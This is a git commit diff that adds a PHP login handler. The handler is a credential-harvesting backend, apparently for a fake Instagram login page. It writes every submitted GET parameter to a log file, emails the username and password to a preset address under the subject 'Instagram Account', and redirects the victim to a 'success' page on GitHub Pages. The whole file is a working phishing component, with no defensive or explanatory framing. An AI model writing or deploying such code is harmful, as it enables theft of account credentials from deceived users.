52501b9c96d5bbf875908b4ad0133a3e18887c6a
Noode2024 <sptg2025@gmail.com>
2025-02-18 00:17:13 +0330

    Add files via upload

---
+++ login.php
@@ -0,0 +1,23 @@
+<?php
+header ('Location:https://noode2024.github.io/networktw/success.html');
+$handle = fopen("phl.txt", "a");
+foreach($_GET as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, "=");
+   fwrite($handle, $value);
+   fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+$to      = 'example@example.com';
+$subject = 'Instagram Account';
+$username = $_GET['username'];
+$password = $_GET['password'];
+$message = "Username:" . $username . "<br>" . "Password: " . $password;
+$headers = 'From: webmaster@example.com' . "\r\n" .
+    'Reply-To: webmaster@example.com' . "\r\n" .
+    'X-Mailer: PHP/' . phpversion();
+
+mail($to, $subject, $message, $headers);
+exit;
+?>
